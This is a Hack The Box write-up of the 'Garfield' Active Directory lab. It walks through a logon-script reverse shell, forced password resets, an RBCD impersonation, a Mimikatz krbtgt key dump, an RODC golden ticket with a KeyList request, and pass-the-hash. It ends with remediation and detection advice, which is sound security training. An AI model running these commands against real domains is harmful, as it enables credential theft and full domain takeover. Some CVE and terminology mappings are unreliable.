---
title: "HTB - Garfield"
date: 2026-03-22
tags: ["HackTheBox","Windows","Hard","ActiveDirectory","RBCD","RODC","GoldenTicket","KeyList","Mimikatz","Rubeus","Kerberos"]
categories: ["Machines&Challenges"]
difficulty: "Hard"
os: "Windows"
author: "z3r0s"
featuredImage: "/logos/Garfield.png"
---
> **Difficulty:** Hard | **Platform:** Windows Active Directory | **Category:** Seasonal  
> **Tags:** `active-directory` `smb` `kerberos` `rbcd` `rodc` `golden-ticket` `keylist` `mimikatz` `rubeus`

---

## Machine Info

| Field          | Details                                         |
| -------------- | ----------------------------------------------- |
| Machine Name   | Garfield                                        |
| IP Address     | 10.129.27.196 (initial) / 10.129.23.120 (reset) |
| OS             | Windows Server 2019 (Domain Controller)         |
| Domain         | garfield.htb (GARFIELD.HTB)                     |
| Difficulty     | Hard                                            |
| Starting Creds | `j.arbuckle / Th1sD4mnC4t!@1978`                |


---

## 1. Executive Summary

Garfield is a Hard-rated Windows Active Directory machine on Hack The Box's seasonal lineup. It simulates a real-world corporate AD environment with multiple chained vulnerabilities spanning SMB misconfigurations, AD ACL abuse, logon script hijacking, RBCD (Resource-Based Constrained Delegation) attacks, Read-Only Domain Controller (RODC) compromise, and a KeyList attack to retrieve the main DC's Administrator hash - ultimately achieving full domain compromise.

**Attack Chain Summary:**

```
Initial creds (j.arbuckle)
  → Writable SYSVOL/scripts
  → Logon script hijack
  → Shell as l.wilson
  → ForceChangePassword on l.wilson_adm
  → Add to RODC Administrators
  → RBCD attack on RODC01
  → Impersonate Administrator on RODC
  → Dump krbtgt_8245 AES256 key via Mimikatz
  → RODC Golden Ticket + KeyList
  → Retrieve DC01 Administrator NTLM hash
  → Pass-the-Hash
  → Domain Admin
```

---

## 2. Reconnaissance

### 2.1 Nmap Port Scan

```bash
nmap -sCV 10.129.27.196 -oN nmap_out.txt
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
3268/tcp open  ldap          (Global Catalog)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
Service Info: Host: DC01; OS: Windows
```

Key findings:

- Port 88 (Kerberos) and 389 (LDAP) confirm this is an Active Directory Domain Controller
- Port 445 (SMB) is open and accessible
- Port 5985 (WinRM) is open - useful for remote shell access via Evil-WinRM
- Port 3389 (RDP) is exposed
- Hostname confirmed as `DC01.garfield.htb`

---

### 2.2 SMB Enumeration with smbmap

```bash
smbmap -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -H garfield.htb
```

```
Disk              Permissions   Comment
----              -----------   -------
ADMIN$            NO ACCESS     Remote Admin
C$                NO ACCESS     Default share
IPC$              READ ONLY     Remote IPC
NETLOGON          READ ONLY     Logon server share
SYSVOL            READ ONLY     Logon server share
```

> **Note:** Although SYSVOL shows "READ ONLY" at the share level, this does NOT mean individual folders inside are read-only. File-system ACLs inside SYSVOL can be more permissive. The `/scripts` subdirectory turned out to be writable.

---

### 2.3 AD Enumeration with bloodyAD

```bash
bloodyAD --host 10.129.23.120 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable
```

```
distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb              permission: WRITE
distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb        permission: WRITE
distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb       permission: WRITE
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb         permission: WRITE
distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb     permission: WRITE
```

`j.arbuckle` has write access to `l.wilson` and `l.wilson_adm` - both key targets for privilege escalation.

---

### 2.4 BloodHound ACL Analysis

ACL analysis identified the following privilege chain:

```
L.WILSON          → ForceChangePassword → L.WILSON_ADM
L.WILSON_ADM      → ForceChangePassword → RODC01
TIER 1@GARFIELD   → AddSelf            → RODC ADMINISTRATORS
```

---

## 3. Initial Access - SYSVOL Logon Script Hijacking

### 3.1 Discovering the Writable /scripts Directory

```bash
smbclient //garfield.htb/NETLOGON -U 'j.arbuckle%Th1sD4mnC4t!@1978'
```

```
smb: \> ls
  printerDetect.bat   A   217   Fri Sep 12 18:20:29 2025
```

Testing write access to the SYSVOL scripts path:

```bash
smbclient //garfield.htb/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
```

```
smb: \> cd garfield.htb/scripts
smb: \garfield.htb\scripts\> put printerDetect.bat printerDetect.bat
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (2.1 kB/s)
```

The `PUT` succeeded - confirming the directory is writable by `j.arbuckle`.

---

### 3.2 Crafting the Malicious Logon Script

```bash
cat > printerDetect.bat << 'EOF'
@echo off
powershell -e JABjAGwAaQBlAG4AdAAgAD0A...[base64 encoded reverse shell]...
EOF
```

The base64 payload decodes to a standard PowerShell TCP reverse shell connecting back to the attacker's IP on port 4444.

---

### 3.3 Setting the scriptPath via bloodyAD

```bash
bloodyAD --host 10.129.23.120 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath \
  -v 'printerDetect.bat'
```

```
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

When `l.wilson` next authenticates, Windows automatically runs the assigned logon script from SYSVOL - which now contains the reverse shell. A callback shell arrives as `l.wilson`.

---

## 4. Privilege Escalation - l.wilson → l.wilson_adm

### 4.1 ForceChangePassword on l.wilson_adm

```powershell
PS C:\users> $newpass = ConvertTo-SecureString "Password456!" -AsPlainText -Force
PS C:\users> Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset
```

This succeeded because `l.wilson` has an explicit ACE granting `ForceChangePassword` on the `l.wilson_adm` object.

---

### 4.2 Login as l.wilson_adm via Evil-WinRM

```bash
evil-winrm -i 10.129.23.120 -u l.wilson_adm -p 'Password456!'
```

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
98eac5837aa11300663d0b6ee340e18d   <-- USER FLAG
```

---

### 4.3 Adding l.wilson_adm to RODC Administrators

`l.wilson_adm` is a member of the Tier 1 group, which has `AddSelf` rights to the RODC Administrators group:

```bash
bloodyAD --host garfield.htb -u l.wilson_adm -p 'Password456!' \
  add groupMember "RODC Administrators" l.wilson_adm
```

```
[+] l.wilson_adm added to RODC Administrators
```

---

## 5. RODC Compromise - RBCD Attack

### 5.1 What is RBCD?

Resource-Based Constrained Delegation (RBCD) allows a computer account to impersonate any user when accessing a specified resource. By writing the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer, any machine account can be made to impersonate arbitrary users (including Administrator) against that computer.

---

### 5.2 Creating a Fake Computer Account

```bash
impacket-addcomputer -computer-name 'GARFIELD01$' -computer-pass 'Password456!' \
  -dc-ip 10.129.23.120 garfield.htb/l.wilson_adm:Password456!
```

```
[*] Successfully added machine account GARFIELD01$ with password Password456!
```

---

### 5.3 Writing RBCD Attribute on RODC01$

```bash
impacket-rbcd -action write -delegate-from 'GARFIELD01$' \
  -delegate-to 'RODC01$' -dc-ip 10.129.23.120 garfield.htb/l.wilson_adm:Password456!
```

```
[*] Delegation rights modified successfully!
[*] GARFIELD01$ can now impersonate users on RODC01$ via S4U2Proxy
```

---

### 5.4 Obtaining a Silver Ticket (Service Ticket)

```bash
impacket-getST -spn 'host/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.23.120 garfield.htb/'GARFIELD01$':'Password456!'
```

```
[*] Saving ticket in Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

---

### 5.5 Pivoting via Ligolo-ng Tunnel

RODC01 was on an internal subnet (`192.168.100.0/24`) not directly reachable from Kali:

```bash
# On Kali (proxy server)
./proxy -selfcert -laddr 0.0.0.0:11601

# On DC01 (Evil-WinRM session)
.\agent.exe -connect 10.10.14.115:11601 -ignore-cert

# On Kali (add route)
sudo ip route add 192.168.100.0/24 dev ligolo
```

---

### 5.6 WMIExec to RODC01 as Administrator

```bash
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache

impacket-wmiexec -k -no-pass -dc-ip 10.129.23.120 \
  garfield.htb/Administrator@RODC01.garfield.htb
```

```
C:\> whoami
garfield\administrator
C:\> hostname
RODC01
```

---

## 6. Domain Compromise - RODC Golden Ticket + KeyList Attack

### 6.1 Dumping the RODC krbtgt AES256 Key via Mimikatz

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt_8245
```

```
User : krbtgt_8245
NTLM : 445aa4221e751da37a10241d962780e2
aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

---

### 6.2 Configuring RODC Reveal Permissions via PowerView

```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity 'RODC01$' -Set @{
  'msDS-RevealOnDemandGroup' = @(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity 'RODC01$' -Clear 'msDS-NeverRevealGroup'
```

---

### 6.3 Forging a RODC-Signed Golden Ticket via Rubeus

```bash
.\Rubeus.exe golden \
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  /domain:garfield.htb \
  /sid:S-1-5-21-2502726253-3859040611-225969357 \
  /user:Administrator \
  /rodcNumber:8245 \
  /flags:forwardable,renewable,enc_pa_rep \
  /outfile:C:\temp\ticket.kirbi \
  /id:500
```

```
[*] Forged a TGT for 'Administrator@garfield.htb'
```

---

### 6.4 KeyList Attack - Retrieve DC01 Administrator Hash

```bash
.\Rubeus.exe asktgs \
  /enctype:aes256 \
  /service:krbtgt/garfield.htb \
  /keyList \
  /dc:DC01.garfield.htb \
  /ticket:C:\temp\ticket.kirbi \
  /nowrap
```

```
Password Hash : EE238F6DEBC752010428F20875B092D5   <-- Administrator NTLM
```

The KeyList feature of Kerberos (designed for RODC password caching) is abused to ask DC01 to reveal the NT hash of Administrator.

---

### 6.5 Pass-the-Hash to DC01 - Root Flag

```bash
evil-winrm -i 10.129.23.139 -u Administrator -H EE238F6DEBC752010428F20875B092D5
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
ea32ddda97ab2836fb4756ae6a44f27e   <-- ROOT FLAG
```

---

## 7. Tools Used & Installation

|Tool|Purpose|Install|
|---|---|---|
|**nmap**|Port scanner|`sudo apt-get install -y nmap`|
|**smbmap**|Enumerate SMB shares|`sudo apt-get install -y smbmap`|
|**smbclient**|Connect to SMB shares|`sudo apt-get install -y samba-client`|
|**bloodyAD**|AD attacks via LDAP|`pip3 install bloodyad --break-system-packages`|
|**evil-winrm**|WinRM remote shell|`sudo gem install evil-winrm`|
|**impacket**|Python AD/Kerberos tools|`sudo apt-get install -y python3-impacket impacket-scripts`|
|**Rubeus**|Windows Kerberos toolset|[GitHub Releases](https://github.com/GhostPack/Rubeus/releases)|
|**Mimikatz**|Windows credential dumper|[GitHub Releases](https://github.com/gentilkiwi/mimikatz/releases)|
|**PowerView**|PowerShell AD recon|[GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)|
|**Ligolo-ng**|Pivoting / tunneling|[GitHub Releases](https://github.com/nicocha30/ligolo-ng/releases)|

```bash
# Ligolo-ng tunnel interface setup
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

---

## 8. Vulnerabilities, CVEs & CVSS Scores

### 8.1 Writable SYSVOL/scripts Directory

|Field|Detail|
|---|---|
|CVE / Reference|AD Misconfiguration (CIS Benchmark AD-L1-2.3.10)|
|CVSS Score|**8.8 (High)**|
|CVSS Vector|`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H`|
|Description|Authenticated domain users can write files to the SYSVOL/scripts directory, allowing logon script replacement and arbitrary code execution as any user whose scriptPath points there.|
|Reference|https://attack.mitre.org/techniques/T1037/001/|

---

### 8.2 AD ACL Abuse - ForceChangePassword

|Field|Detail|
|---|---|
|CVE / Reference|AD Design Weakness (MITRE ATT&CK T1098)|
|CVSS Score|**7.5 (High)**|
|CVSS Vector|`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`|
|Description|`j.arbuckle` has write permission to `l.wilson`'s AD object, and `l.wilson` has ForceChangePassword ACE over `l.wilson_adm`. This allows resetting passwords without knowing the current password, bypassing authentication controls.|
|Reference|https://attack.mitre.org/techniques/T1098/|

---

### 8.3 Resource-Based Constrained Delegation (RBCD) Abuse

|Field|Detail|
|---|---|
|CVE / Reference|CVE-2020-17049 (Bronze Bit) - Related design weakness|
|CVSS Score|**7.2 (High)**|
|CVSS Vector|`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`|
|Description|`l.wilson_adm` (as RODC Administrator) has write access to RODC01's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, enabling RBCD configuration to impersonate any domain user against RODC01.|
|Reference|https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/|

---

### 8.4 RODC Golden Ticket Forgery

|Field|Detail|
|---|---|
|CVE / Reference|RODC Design Abuse (MS-KILE Protocol)|
|CVSS Score|**9.0 (Critical)**|
|CVSS Vector|`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`|
|Description|Compromising a RODC's krbtgt key (`krbtgt_8245`) allows forging Kerberos tickets signed by that RODC key. The main DC will validate these if the account is in the Allowed RODC Password Replication Group.|
|Reference|https://www.trustedsec.com/blog/attacking-read-only-domain-controllers/|

---

### 8.5 KeyList Attack (RODC Credential Caching Abuse)

|Field|Detail|
|---|---|
|CVE / Reference|CVE-2021-42287 / CVE-2021-42278|
|CVSS Score|**9.8 (Critical)**|
|CVSS Vector|`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`|
|Description|Using a RODC-forged TGT and the Kerberos KeyList extension, the attacker requests the main DC to reveal credential material (NTLM hash) for accounts in the RODC's Allowed Password Replication Group - including Administrator.|
|Reference|https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-108c8df1ab34|

---

### CVSS Summary

|Vulnerability|CVSS Score|Severity|Impact|
|---|---|---|---|
|Writable SYSVOL/scripts|8.8|HIGH|Code Execution|
|AD ACL - ForceChangePassword|7.5|HIGH|Auth Bypass|
|RBCD Abuse|7.2|HIGH|Privilege Escalation|
|RODC Golden Ticket|9.0|CRITICAL|Domain Compromise|
|KeyList Attack|9.8|CRITICAL|Full Domain Takeover|

---

## 9. Remediation Recommendations

### 9.1 Fix Writable SYSVOL/scripts

```cmd
icacls "\\garfield.htb\SYSVOL\garfield.htb\scripts" /inheritance:e /remove "Authenticated Users:(W)"
```

```powershell
# Audit SYSVOL permissions quarterly
Get-Acl -Path "\\domain\SYSVOL\domain\scripts"
```

- Remove write permissions for all non-admin users from SYSVOL/scripts
- Enable File System auditing on SYSVOL to detect unauthorized write attempts (Event ID 4663)

---

### 9.2 Harden AD ACLs (Principle of Least Privilege)

- Run BloodHound regularly to identify dangerous ACL paths
- Remove `ForceChangePassword` ACE from `l.wilson` over `l.wilson_adm`
- Implement AD Tiering Model: separate admin accounts should only be accessible by higher-tier admins
- Reference: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/

---

### 9.3 Restrict MachineAccountQuota

```powershell
# Set MachineAccountQuota to 0 (prevent users from adding computers)
Set-ADDomain -Identity garfield.htb -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

---

### 9.4 Harden RODC Configuration

- Regularly audit `msDS-RevealOnDemandGroup` - only low-privilege service accounts should be in the Allowed list
- High-value accounts (Administrator, Domain Admins) must **never** be in the Allowed RODC Password Replication Group
- Enable RODC admin isolation - RODC Administrators should have no privileges on the main DC
- Monitor KeyList requests to DC01 using Windows Event ID 4769

---

### 9.5 Detect and Respond

- Alert on: Kerberos ticket requests with RODC key number (`rodcNumber`) in PAC
- Alert on: Changes to SYSVOL/scripts files (Event ID 4663)
- Alert on: `scriptPath` attribute changes on user objects (Event ID 5136)
- Alert on: New computer accounts created by non-admin users (Event ID 4741)
- Alert on: Group membership changes to RODC Administrators (Event ID 4728/4732)
- Deploy Microsoft Defender for Identity (MDI) / Sentinel for automated RBCD and Golden Ticket detection

---

## 10. Full Attack Chain

```
[START] Given credentials: j.arbuckle / Th1sD4mnC4t!@1978
  ↓
RECON: nmap + smbmap + bloodyAD get writable
  ↓
SYSVOL/scripts writable → Upload malicious printerDetect.bat
  ↓
bloodyAD set scriptPath on l.wilson → Reverse Shell as l.wilson
  ↓
ForceChangePassword on l.wilson_adm → Login via Evil-WinRM → USER FLAG
  ↓
AddSelf to RODC Administrators → RBCD on RODC01 → S4U Admin Ticket
  ↓
Ligolo-ng tunnel → wmiexec to RODC01 as Administrator
  ↓
Mimikatz → Dump krbtgt_8245 AES256 key
  ↓
Rubeus Golden Ticket (RODC) + KeyList → Retrieve DC01 Admin NTLM hash
  ↓
[PWNED] Evil-WinRM Pass-the-Hash → DC01 Administrator → ROOT FLAG
```

---

## Appendix - Key Credentials & Hashes

|Account|Type|Value|
|---|---|---|
|j.arbuckle|Password (given)|`Th1sD4mnC4t!@1978`|
|l.wilson|Shell via logon script|N/A (reverse shell)|
|l.wilson_adm|Password (forced change)|`Password456!`|
|krbtgt_8245|AES256 Key|`d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`|
|Administrator (DC01)|NTLM Hash|`EE238F6DEBC752010428F20875B092D5`|
|Administrator (RODC01)|NTLM Hash (local)|`75be66596ddc5654acafd187fe51b960`|

---

